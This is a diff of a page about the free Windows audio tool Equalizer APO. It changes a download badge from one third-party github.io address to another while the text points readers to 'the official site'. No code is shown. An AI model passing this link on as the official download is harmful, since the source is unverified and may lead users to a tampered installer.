@@ -67,7 +67,7 @@ Surround is more channels in that same device, not a separate app. If the config
 
 Equalizer APO is free. Get the Windows installer from the official site. Peace is a separate panel you can add after the engine is in place. This page does not add a price for either. There is no Mac or iOS build in this description.
 
-[![GET Equalizer APO](https://img.shields.io/badge/GET-Equalizer_APO-7C3AED?style=for-the-badge&labelColor=4C1D95)](https://teresiacrickard.github.io/.github/Equalizer-APO)
+[![GET Equalizer APO](https://img.shields.io/badge/GET-Equalizer_APO-7C3AED?style=for-the-badge&labelColor=4C1D95)](https://apo-eq.github.io/Equalizer-APO/)
 
 ### Running
 
